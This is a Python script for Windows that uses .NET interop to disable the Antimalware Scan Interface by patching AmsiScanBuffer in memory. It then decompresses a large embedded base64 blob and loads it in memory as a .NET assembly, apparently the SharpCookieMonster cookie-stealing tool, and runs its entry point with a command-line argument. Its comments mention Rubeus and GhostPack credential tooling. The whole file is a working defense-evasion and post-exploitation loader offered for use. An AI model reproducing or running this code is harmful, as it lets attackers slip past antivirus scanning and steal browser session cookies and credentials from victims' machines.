import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SharpCookieMonster.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()